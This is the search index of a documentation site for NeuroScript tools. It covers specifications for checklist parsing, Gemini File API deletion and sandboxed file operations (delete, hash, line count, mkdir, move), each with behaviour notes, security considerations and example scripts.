</ul>"},{"location":"ns/tools/#io-tools-io","title":"IO Tools (<code>IO.*</code>)","text":"<ul> <li>(Log, Input specs needed)</li> </ul>"},{"location":"ns/tools/#llm-tools-llm","title":"LLM Tools (<code>LLM.*</code>)","text":"<ul> <li>(Call specs needed)</li> </ul>"},{"location":"ns/tools/#available-tool-specifications-file-api-tools-external","title":"Available Tool Specifications (File API Tools - External)","text":"<p>These tools interact with the Gemini File API and may not be considered core language tools in the same way as the above.</p> <ul> <li>FileAPI.ListAPIFiles: Lists files stored in the Gemini File API. (Previously <code>TOOL.ListAPIFiles</code>)</li> <li>FileAPI.DeleteAPIFile: Deletes a file from the Gemini File API. (Previously <code>TOOL.DeleteAPIFile</code>)</li> <li>FileAPI.UploadFile: Uploads a local file to the Gemini File API. (Previously <code>TOOL.UploadFile</code>)</li> <li>FileAPI.SyncFiles: Synchronizes files between local and API storage. (Previously <code>TOOL.SyncFiles</code>)</li> </ul>"},{"location":"ns/tools/#available-tool-specifications-neurodata-tools-external","title":"Available Tool Specifications (NeuroData Tools - External)","text":"<ul> <li>NeuroData.QueryTable: Queries NeuroData Table (<code>.ndtable</code>) files. (Previously <code>TOOL.QueryTable</code>)</li> </ul> <p>(This list should be updated as more tool specifications are created or existing ones are updated.)</p>"},{"location":"ns/tools/checklist_load_tree/","title":"Checklist load tree","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 1.0  :: id: tool-spec-checklistloadtree-v1.0  :: status: approved  :: dependsOn: docs/metadata.md, docs/ns/types/handle.md, docs/ns/types/generictree.md, docs/ns/dataformats/checklist.md  :: howToUpdate: Review when ChecklistLoadTree implementation or underlying Checklist parsing/adapter logic changes.</p> <p># Tool Specification: ChecklistLoadTree (v1.0)</p> <ul> <li>Tool Name: <code>ChecklistLoadTree</code> (v1.0)</li> <li>Purpose: Parses text content formatted as a NeuroData Checklist into an internal <code>GenericTree</code> structure, returning a handle to the tree. This enables querying, modification, and potentially re-serialization of the checklist using standard Tree tools.</li> <li>NeuroScript Syntax: <pre><code>set treeHandle = ChecklistLoadTree(content=checklistString)\n</code></pre></li> <li>Arguments:</li> <li><code>content</code> (String): Required. The string containing the checklist content. Must adhere to the NeuroData Checklist format (metadata <code>:: key: value</code>, items <code>- [status] Text</code> or <code>- |status| Text</code>, headings <code># ...</code>, comments <code>-- ...</code> or <code># ...</code>, indentation for hierarchy).</li> <li>Return Value: (String)</li> <li>Description: Upon success, returns a handle ID (string) referencing the created <code>core.GenericTree</code> object stored within the interpreter's handle manager. The handle can be used with other Tree tools (e.g., <code>TreeGetNode</code>, <code>TreeFindNodes</code>). The underlying handle type is <code>generic_tree</code>.</li> <li>Error Handling: On failure (e.g., invalid input format, empty content, internal error during parsing or tree creation), the tool returns a standard Go <code>error</code>. This error is typically caught by the interpreter's <code>on_error</code> mechanism or terminates the script execution if unhandled. It does not return an error message as part of the string result.</li> <li>Behavior:</li> <li>Validates that the <code>content</code> argument is provided and is a string. Returns a <code>core.ErrValidationTypeMismatch</code> error if not.</li> <li>Invokes the internal NeuroData Checklist parser (<code>checklist.ParseChecklist</code>) on the <code>content</code> string.</li> <li>If parsing fails due to genuinely empty or invalid content (containing no recognizable checklist items or metadata), a <code>core.ErrInvalidArgument</code> error is returned (wrapping <code>checklist.ErrNoContent</code>), as a tree cannot be formed.</li> <li>If parsing fails due to malformed item syntax (e.g., <code>- [xx] Bad</code>), a <code>core.ErrInvalidArgument</code> error is returned (wrapping <code>checklist.ErrMalformedItem</code>). Other scanning errors also result in <code>core.ErrInvalidArgument</code>.</li> <li>If parsing succeeds, invokes the internal adapter (<code>checklist.ChecklistToTree</code>) to convert the parsed items and metadata into a <code>core.GenericTree</code> structure.<ul> <li>A root node of type <code>checklist_root</code> is created. Any metadata parsed (<code>:: key: value</code>) is stored as attributes on this root node.</li> <li>Each checklist item becomes a node of type <code>checklist_item</code>.</li> <li>The full text of the item (as parsed, following the <code>- [x]</code> or <code>- |x|</code> marker) is stored in the node's <code>Value</code> field (as a string).</li> <li>The item's status is mapped and stored in the <code>status</code> attribute (values: <code>\"open\"</code>, <code>\"done\"</code>, <code>\"skipped\"</code>, <code>\"partial\"</code>, <code>\"inprogress\"</code>, <code>\"blocked\"</code>, <code>\"question\"</code>, <code>\"special\"</code>, <code>\"unknown\"</code>).</li> <li>If the item was parsed as automatic (<code>- | | ...</code>), an attribute <code>is_automatic: \"true\"</code> is added to the node.</li> <li>If the status is <code>\"special\"</code> and the symbol used was not one of the standard ones (<code>&gt;</code>, <code>!</code>, <code>?</code>), the actual symbol is stored in the <code>special_symbol</code> attribute.</li> <li>Parent-child relationships in the tree reflect the indentation levels in the source checklist.</li> </ul> </li> <li>If the tree adaptation process fails internally, a <code>core.ErrInternalTool</code> error is returned.</li> <li>Registers the newly created <code>GenericTree</code> with the interpreter's handle manager. If handle registration fails, a <code>core.ErrInternalTool</code> error is returned.</li> <li>Upon successful creation and registration, returns the string handle ID for the tree.</li> <li>Security Considerations:</li> <li>This tool does not directly perform I/O or execute external commands.</li> <li>Input is parsed according to defined checklist rules; malformed input generally results in errors rather than unsafe execution.</li> <li>Processing extremely large checklist strings could consume significant memory during parsing and tree construction. Ensure input sizes are reasonable within the execution environment.</li> <li>Handles returned by this tool consume memory in the interpreter's handle manager. While handles are typically cleaned up when an interpreter context ends, long-running processes should consider handle lifecycle management (potential future <code>ReleaseHandle</code> tool).</li> <li>Examples: <pre><code># Example: Load a checklist and inspect it using Tree tools\n\nset myListContent = ```\n:: title: Project Tasks\n:: version: 0.1\n\n# Phase 1\n- [x] Define requirements\n- [?] Design architecture (needs review)\n  - [ ] Sub-task 1.1\n\n# Phase 2\n- | | Implement core features (Auto)\n  - |-| Sub-feature 2.1 (Auto partial)\n</code></pre></li> </ul> <p>set handle = ChecklistLoadTree(content=myListContent)    if handle == nil        fail message=\"Failed to load checklist\"    endif</p> <p># Get root metadata - Assuming TreeGetNode exists and root ID is predictable/discoverable    # NOTE: Requires TreeGetNode tool to be available and root ID logic stable.    set root = TreeGetNode(handle=handle, nodeId=\"node-1\") # Example: Assume root is node-1    if root != nil        emit \"Title: \" + root.Attributes[\"title\"]    else        emit \"Could not retrieve root node.\"    endif</p> <p># Find all automatic items - Assuming TreeFindNodes exists    # NOTE: Requires TreeFindNodes tool to be available.    set autoItems = TreeFindNodes(handle=handle, attributes={\"is_automatic\":\"true\"})    emit \"Found automatic items:\"    set i = 0    while i &lt; len(autoItems)        set node = autoItems[i]        emit \"  - \" + node.Value + \" (Status: \" + node.Attributes[\"status\"] + \")\"        set i = i + 1    endwhile</p> <p># Example of how an error from ChecklistLoadTree would be handled    on_error means      emit \"An error occurred: \" + system.error_message # Placeholder for actual error access      fail \"Script failed due to checklist processing error.\"    endon</p> <p>set badContent = \"- [xx] Malformed item\"    # The following call would trigger the on_error block above    # set badHandle = ChecklistLoadTree(content=badContent)    <code>``  * **Go Implementation Notes:**    * Location:</code>pkg/neurodata/checklist/checklist_tool.go<code>* Key Go Functions:</code>toolChecklistLoadTree<code>,</code>checklist.ParseChecklist<code>,</code>checklist.ChecklistToTree<code>,</code>interpreter.RegisterHandle<code>,</code>core.NewGenericTree<code>* Registration:</code>RegisterChecklistTools<code>in</code>pkg/neurodata/checklist/checklist_tool.go<code>adds</code>toolChecklistLoadTreeImpl<code>to the registry.    * Depends on types and functions within</code>pkg/core<code>and</code>pkg/neurodata/checklist`.</p>"},{"location":"ns/tools/delete_api_file/","title":"delete_api_file","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-delete-api-file-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go  :: howToUpdate: Update if argument validation or return value changes.</p> <p># Tool Specification: TOOL.DeleteAPIFile (v0.1)</p> <ul> <li>Tool Name: TOOL.DeleteAPIFile (v0.1)</li> <li>Purpose: Permanently deletes a specific file from the Gemini File API storage using its unique API resource name.</li> <li>NeuroScript Syntax: <pre><code>deleteResult := TOOL.DeleteAPIFile(apiFileName)\n</code></pre></li> <li>Arguments:<ul> <li><code>api_file_name</code> (String): Required. The unique resource name of the file to delete, typically starting with \"files/\" (e.g., \"files/abc123xyz\").</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A confirmation string (e.g., \"Successfully deleted API file: files/abc123xyz\").</li> <li>On failure: An error string describing the failure (e.g., \"Failed to delete API file 'files/...' : rpc error: code = NotFound desc = File not found\"). A Go-level error will also be returned to the interpreter.</li> </ul> </li> <li>Behavior:<ol> <li>Checks if the internal GenAI client is initialized. Returns an error if not.</li> <li>Validates that the <code>api_file_name</code> argument is a non-empty string.</li> <li>Calls the Gemini File API's <code>DeleteFile</code> endpoint with the provided <code>api_file_name</code>.</li> <li>If the API call succeeds, returns a success message string.</li> <li>If the API call fails (e.g., file not found, permission denied), returns an error message string and propagates the Go error.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> with permission to delete files.</li> <li>Deletion is permanent and cannot be undone.</li> <li>Network access to Google Cloud services is required.</li> </ul> </li> <li>Examples: <pre><code>// Assume apiNameToDelete holds \"files/some-generated-id\"\napiNameToDelete := \"files/abc123xyz\"\nresult := TOOL.DeleteAPIFile(apiNameToDelete)\nIO.Print(\"Deletion Result:\", result)\n\n// Example: Delete all files listed by ListAPIFiles\nallFiles := TOOL.ListAPIFiles()\nFOR fileInfo IN allFiles DO\n    IF fileInfo[\"error\"] == null AND fileInfo[\"name\"] != null THEN\n        IO.Print(\"Attempting to delete:\", fileInfo[\"name\"])\n        deleteMsg := TOOL.DeleteAPIFile(fileInfo[\"name\"])\n        IO.Print(\"  Result:\", deleteMsg)\n    END\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolDeleteAPIFile</code>.</li> <li>Uses <code>interpreter.GenAIClient().DeleteFile()</code>.</li> <li>Registered via <code>registerFileAPITools</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_deletefile/","title":"fs_deletefile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-deletefile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_delete.go, docs/script_spec.md :: relatedTo: FS.MoveFile, FS.WriteFile, FS.Mkdir :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_deletefile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_deletefile/#tool-specification-fsdeletefile-v01","title":"Tool Specification: <code>FS.DeleteFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.DeleteFile</code> (v0.1)</li> <li>Purpose: Deletes a specified file or an empty directory within the sandbox. It does not delete non-empty directories.</li> <li>NeuroScript Syntax: <code>CALL FS.DeleteFile(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path (within the sandbox) of the file or empty directory to be deleted.</li> </ul> </li> <li>Return Value: (String)<ul> <li>Returns the literal string <code>\"OK\"</code> if: (Accessible via <code>LAST</code> after the <code>CALL</code>)<ul> <li>The file or empty directory was successfully deleted.</li> <li>The specified path did not exist (considered idempotent success).</li> </ul> </li> <li>Returns an error message string if: (Accessible via <code>LAST</code> after the <code>CALL</code>)<ul> <li>Path validation fails.</li> <li>The path refers to a non-empty directory.</li> <li>A permission error or other OS-level error occurs during deletion.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided and is not empty.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>path</code> argument against the <code>sandboxDir</code>. If validation fails, returns an error message string.</li> <li>Attempts to delete the file or directory at the validated absolute path using <code>os.Remove</code>.</li> <li>If <code>os.Remove</code> returns an error:<ul> <li>Checks if the error indicates the path does not exist (<code>os.ErrNotExist</code>). If so, returns <code>\"OK\"</code>.</li> <li>Checks if the error message indicates the directory is not empty (using string checks for common OS messages). If so, returns an error message string detailing this.</li> <li>For any other error (e.g., permissions), returns an error message string containing the OS error details.</li> </ul> </li> <li>If <code>os.Remove</code> succeeds without error, returns <code>\"OK\"</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code>. Cannot delete files or directories outside the sandbox.</li> <li>Performs filesystem modification (deletion). Deletions are generally permanent.</li> <li>Explicitly prevents deletion of non-empty directories, adding a layer of safety against accidental recursive deletion.</li> <li>Relies on the underlying operating system's permissions for deletion capabilities.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create and delete a file\nCALL FS.WriteFile(\"temp_file_to_delete.txt\", \"Delete me\")\nSET write_ok = LAST\n\nCALL FS.DeleteFile(\"temp_file_to_delete.txt\")\nSET delete_status = LAST\n\nIF delete_status == \"OK\" THEN\n    EMIT \"Successfully deleted temp_file_to_delete.txt\"\nELSE\n    EMIT \"Error deleting file: \" + delete_status\nENDBLOCK\n\n# Example 2: Attempt to delete a non-existent file (should return OK)\nCALL FS.DeleteFile(\"this_does_not_exist.tmp\")\nSET non_exist_status = LAST\nEMIT \"Status for deleting non-existent file: \" + non_exist_status # Expect \"OK\"\n\n# Example 3: Create a directory, add a file, try to delete (will fail)\nCALL FS.Mkdir(\"dir_to_delete\")\nCALL FS.WriteFile(\"dir_to_delete/cannot_delete_me.txt\", \"I prevent deletion\")\n\nEMIT \"Attempting to delete non-empty directory...\"\nCALL FS.DeleteFile(\"dir_to_delete\")\nSET non_empty_delete_status = LAST\nIF non_empty_delete_status != \"OK\" THEN\n    EMIT \"Deletion failed as expected: \" + non_empty_delete_status\n    # Expected error message like: Failed to delete 'dir_to_delete': ...directory not empty...\nELSE\n    EMIT \"Deletion unexpectedly succeeded for non-empty directory.\"\nENDBLOCK\n\n# Example 4: Delete the file inside, then delete the now-empty directory\nCALL FS.DeleteFile(\"dir_to_delete/cannot_delete_me.txt\")\nSET delete_inner_status = LAST\nEMIT \"Deleted inner file status: \" + delete_inner_status\n\nCALL FS.DeleteFile(\"dir_to_delete\")\nSET empty_dir_delete_status = LAST\nEMIT \"Status for deleting empty directory: \" + empty_dir_delete_status # Expect \"OK\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_delete.go</code></li> <li>Function: <code>toolDeleteFile</code></li> <li>Spec Name: <code>DeleteFile</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>errors</code>, <code>strings</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsDeleteTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, error</code>. Handles <code>ErrNotExist</code> as success (\"OK\") and checks for directory-not-empty errors specifically.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_filehash/","title":"fs_filehash","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-filehash-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_hash.go, docs/script_spec.md :: relatedTo: FS.ReadFile :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_filehash/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_filehash/#tool-specification-fsfilehash-v01","title":"Tool Specification: <code>FS.FileHash</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.FileHash</code> (v0.1)</li> <li>Purpose: Calculates the SHA256 hash of a specified file within the sandbox and returns it as a hex-encoded string. Useful for verifying file integrity or detecting changes.</li> <li>NeuroScript Syntax: <code>CALL FS.FileHash(filepath: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path (within the sandbox) of the file to hash.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string containing the lowercase hex-encoded SHA256 hash of the file's content. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error (e.g., path validation fails, file not found, path is a directory, read error): Returns an empty string (<code>\"\"</code>). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>filepath</code>) of type String is provided and is not empty.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. Returns <code>\"\"</code> if validation fails.</li> <li>Attempts to open the file at the validated absolute path. Returns <code>\"\"</code> if opening fails (e.g., file not found, permission denied).</li> <li>Checks if the opened path refers to a directory. If it is a directory, returns <code>\"\"</code>.</li> <li>Initializes a new SHA256 hasher.</li> <li>Reads the entire file content and feeds it into the hasher using <code>io.Copy</code>. Returns <code>\"\"</code> if there's an error during reading.</li> <li>Computes the final SHA256 hash digest.</li> <li>Formats the hash digest as a lowercase hexadecimal string.</li> <li>Returns the resulting hex string.</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code>. Cannot access files outside the sandbox.</li> <li>Reads the entire file content into memory implicitly during the <code>io.Copy</code> operation for hashing. Very large files could consume significant memory and processing time.</li> <li>Does not modify the file system.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Hash a known file\nCALL FS.WriteFile(\"data.txt\", \"This is a test file.\") # Create file\nSET write_ok = LAST\n\nCALL FS.FileHash(\"data.txt\")\nSET file_hash = LAST\n\nIF file_hash == \"\" THEN\n  EMIT \"Error calculating hash for data.txt\"\nELSE\n  EMIT \"SHA256 Hash of data.txt: \" + file_hash\n  # Expected hash for \"This is a test file.\" is typically:\n  # c7be1ed902fb8dd4d48997c6452f5d7e509fbcdbe2808b16bcf4edce4c07d14e\nENDBLOCK\n\n# Example 2: Hash a non-existent file\nCALL FS.FileHash(\"no_file_here.dat\")\nSET missing_hash = LAST\nEMIT \"Hash result for non-existent file: '\" + missing_hash + \"'\" # Expect \"\"\n\n# Example 3: Attempt to hash a directory\nCALL FS.Mkdir(\"temp_dir\")\nSET mkdir_ok = LAST\nCALL FS.FileHash(\"temp_dir\")\nSET dir_hash = LAST\nEMIT \"Hash result for directory: '\" + dir_hash + \"'\" # Expect \"\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_hash.go</code></li> <li>Function: <code>toolFileHash</code></li> <li>Spec Name: <code>FileHash</code></li> <li>Key Go Packages: <code>crypto/sha256</code>, <code>fmt</code>, <code>io</code>, <code>os</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsHashTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, error</code> internally, but handles errors to return the hash or <code>\"\"</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_linecountfile/","title":"fs_linecountfile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-linecountfile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_utils.go, docs/script_spec.md :: relatedTo: FS.ReadFile, FS.ListDirectory :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_linecountfile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_linecountfile/#tool-specification-fslinecountfile-v01","title":"Tool Specification: <code>FS.LineCountFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.LineCountFile</code> (v0.1)</li> <li>Purpose: Counts the number of lines in a specified text file within the sandbox.</li> <li>NeuroScript Syntax: <code>CALL FS.LineCountFile(filepath: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path to the file within the sandbox whose lines should be counted.</li> </ul> </li> <li>Return Value: (Number)<ul> <li>On success: An integer representing the number of lines in the file. (Accessible via <code>LAST</code> after the <code>CALL</code>).<ul> <li>An empty file returns <code>0</code>.</li> <li>Lines are typically delimited by the newline character (<code>\\n</code>).</li> <li>If the file has content but does not end with a newline, the last line is still counted.</li> <li>A file containing only a single newline character returns <code>1</code>.</li> </ul> </li> <li>On error (e.g., file not found, path validation fails, read error): Returns the integer <code>-1</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>filepath</code>) of type String is provided.</li> <li>Retrieves the interpreter's configured <code>sandboxDir</code>.</li> <li>Uses the <code>SecureFilePath</code> helper to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. If validation fails, returns <code>-1</code>.</li> <li>Attempts to read the entire content of the specified file using the validated absolute path (<code>os.ReadFile</code>).</li> <li>If reading the file fails (e.g., not found, permission denied), returns <code>-1</code>.</li> <li>If the file content is empty, returns <code>0</code>.</li> <li>Counts the occurrences of the newline character (<code>\\n</code>) in the content.</li> <li>If the content is not empty and does not end with a newline character, increments the count by 1.</li> <li>Handles the edge case where the file content is exactly <code>\\n</code>, setting the count to <code>1</code>.</li> <li>Returns the final calculated line count as an integer (Number).</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code>. Cannot access files outside the sandbox.</li> <li>Reads file content into memory to perform the count. Very large files could potentially consume significant memory during processing, although the counting itself is generally efficient.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Count lines in a log file\nCALL FS.WriteFile(\"activity.log\", \"User logged in.\\nPerformed action A.\\nUser logged out.\") # Create a 3-line file\nSET write_ok = LAST\n\nCALL FS.LineCountFile(\"activity.log\")\nSET line_count = LAST\n\nIF line_count &gt;= 0 THEN\n    EMIT \"Log file 'activity.log' has \" + line_count + \" lines.\" # Expect 3\nELSE\n    EMIT \"Error counting lines in 'activity.log'.\"\nENDBLOCK\n\n# Example 2: Count lines in a non-existent file\nCALL FS.LineCountFile(\"non_existent_file.txt\")\nSET count_error = LAST\nEMIT \"Line count for non-existent file: \" + count_error # Expect -1\n\n# Example 3: Count lines in an empty file\nCALL FS.WriteFile(\"empty.txt\", \"\")\nSET empty_write_ok = LAST\nCALL FS.LineCountFile(\"empty.txt\")\nSET empty_count = LAST\nEMIT \"Line count for empty file: \" + empty_count # Expect 0\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_utils.go</code></li> <li>Function: <code>toolLineCountFile</code></li> <li>Spec Name: <code>LineCountFile</code></li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>strings</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Registered by <code>registerFsUtilTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>int64, error</code> internally, but handles errors to return the count or -1.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_mkdir/","title":"fs_mkdir","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-mkdir-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_dirs.go, docs/script_spec.md :: relatedTo: FS.ListDirectory, FS.WriteFile, FS.DeletePath :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_mkdir/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_mkdir/#tool-specification-fsmkdir-v01","title":"Tool Specification: <code>FS.Mkdir</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.Mkdir</code> (v0.1)</li> <li>Purpose: Creates a new directory, including any necessary parent directories that do not exist, within the designated sandbox.</li> <li>NeuroScript Syntax: <code>CALL FS.Mkdir(path: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>path</code> (String): Required. The relative path within the sandbox of the directory to create. Intermediate parent directories will be created as needed.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A status message string indicating success (e.g., \"Successfully created directory: logs/today\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure (e.g., \"Mkdir path security error...\", \"Failed to create directory...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>path</code>) of type String is provided.</li> <li>Validates the <code>path</code> argument is not an empty string.</li> <li>Retrieves the interpreter's configured <code>sandboxDir</code>.</li> <li>Determines the parent directory of the requested <code>path</code>.</li> <li>Uses the <code>SecureFilePath</code> helper to validate the parent directory against the <code>sandboxDir</code>. If the parent directory path is invalid or outside the sandbox, returns an error message string.</li> <li>Constructs the full absolute path of the target directory to be created based on the validated parent directory and the final component of the input <code>path</code>.</li> <li>Performs an additional security check to ensure the final absolute path to create does not escape the validated sandbox path (using <code>filepath.Clean</code> and prefix checks). If it escapes, returns an error message string.</li> <li>If all security checks pass, attempts to create the directory (and any necessary parents) using <code>os.MkdirAll</code> with default permissions (0755).</li> <li>If <code>os.MkdirAll</code> fails (e.g., permission denied, path element exists but is not a directory), returns an error message string.</li> <li>If directory creation is successful, returns a success message string including the original relative path.</li> </ol> </li> <li>Security Considerations:<ul> <li>Confined to the interpreter's sandbox directory via <code>SecureFilePath</code> validation on the parent path and explicit checks on the final path.</li> <li>Creates directories with permissions mode 0755 (before umask).</li> <li>Can create multiple directory levels if they don't exist within the sandbox.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create a simple directory\nCALL FS.Mkdir(\"output_data\")\nSET mkdir_status = LAST\nEMIT \"Mkdir status for 'output_data': \" + mkdir_status\n\n# Example 2: Create nested directories\nCALL FS.Mkdir(\"project_files/src/components\")\nSET nested_status = LAST\nIF String.Contains(nested_status, \"Successfully created\") THEN\n    EMIT \"Nested directories created successfully.\"\n    # Now we can safely write a file there\n    CALL FS.WriteFile(\"project_files/src/components/button.js\", \"// Button component code\")\n    SET write_status = LAST\n    EMIT \"File write status: \" + write_status\nELSE\n    EMIT \"Failed to create nested directories: \" + nested_status\nENDBLOCK\n\n# Example 3: Attempt to create directory outside sandbox (will fail)\nCALL FS.Mkdir(\"../../new_system_dir\")\nSET bad_mkdir_status = LAST\n# Status will likely indicate a path security error\nEMIT \"Status of attempting restricted mkdir: \" + bad_mkdir_status\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_fs_dirs.go</code></li> <li>Function: <code>toolMkdir</code></li> <li>Key Go Packages: <code>os</code>, <code>fmt</code>, <code>path/filepath</code>, <code>strings</code></li> <li>Helpers: <code>core.SecureFilePath</code></li> <li>Registration: Called by <code>registerFsDirTools</code> within <code>pkg/core/tools_fs.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/fs_movefile/","title":"fs_movefile","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-fs-movefile-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_fs_move.go, docs/script_spec.md :: relatedTo: FS.WriteFile, FS.Mkdir, FS.DeletePath :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/fs_movefile/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/fs_movefile/#tool-specification-fsmovefile-v01","title":"Tool Specification: <code>FS.MoveFile</code> (v0.1)","text":"<ul> <li>Tool Name: <code>FS.MoveFile</code> (v0.1)</li> <li>Purpose: Moves or renames a file or directory from a source path to a destination path within the sandbox. This operation fails if the destination path already exists.</li> <li>NeuroScript Syntax: <code>CALL FS.MoveFile(source: &lt;String&gt;, destination: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>source</code> (String): Required. The relative path (within the sandbox) of the existing file or directory to be moved/renamed.</li> <li><code>destination</code> (String): Required. The desired new relative path (within the sandbox) for the file or directory. This path must not already exist.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>Returns a Map containing a single key: <code>error</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).<ul> <li>On success: The value associated with the <code>error</code> key is <code>nil</code>. Example: <code>{\"error\": nil}</code>.</li> <li>On failure: The value associated with the <code>error</code> key is a String describing the reason for failure (e.g., path validation error, source not found, destination already exists, OS rename error). Example: <code>{\"error\": \"Destination path 'new/data.txt' already exists.\"}</code>.</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly two arguments (<code>source</code>, <code>destination</code>), both non-empty Strings, are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate both the <code>source</code> and <code>destination</code> paths against the <code>sandboxDir</code>. If either validation fails, returns a Map <code>{\"error\": \"Validation error message\"}</code>.</li> <li>Checks if the validated <code>source</code> path exists using <code>os.Stat</code>. If it does not exist or another error occurs, returns a Map <code>{\"error\": \"Source path error message\"}</code>.</li> <li>Checks if the validated <code>destination</code> path exists using <code>os.Stat</code>.<ul> <li>If it does exist, returns a Map <code>{\"error\": \"Destination path '...' already exists.\"}</code>.</li> <li>If an error other than \"file does not exist\" occurs, returns a Map <code>{\"error\": \"Error checking destination path...\"}</code>.</li> </ul> </li> <li>If the source exists and the destination does not exist, attempts to perform the move/rename operation using <code>os.Rename</code> on the validated absolute paths.</li> <li>If <code>os.Rename</code> fails (e.g., permission denied, cross-device link error), returns a Map <code>{\"error\": \"Failed to move/rename...\"}</code>.</li> <li>If <code>os.Rename</code> succeeds, returns the Map <code>{\"error\": nil}</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Restricted by the interpreter's sandbox directory (<code>sandboxDir</code>) via <code>SecureFilePath</code> validation on both source and destination paths.</li> <li>Performs filesystem modification (move/rename).</li> <li>Explicitly prevents overwriting existing files/directories at the 